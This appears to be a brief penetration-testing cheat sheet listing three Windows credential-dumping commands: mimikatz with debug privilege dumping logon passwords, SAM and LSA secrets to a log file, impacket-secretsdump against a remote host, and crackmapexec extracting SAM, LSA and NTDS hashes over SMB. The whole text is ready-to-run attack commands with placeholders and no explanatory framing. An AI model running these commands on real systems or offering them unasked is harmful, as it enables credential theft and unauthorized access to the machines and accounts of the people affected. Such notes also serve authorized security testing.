

```
.\mimikatz.exe "privilege::debug" "log mimikatz_passwords.txt" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::lsa /patch" "exit"

impacket-secretsdump <user>@<ip>

crackmapexec smb <ip> -u <user> -p <password> --sam / --lsa / --ntds

```

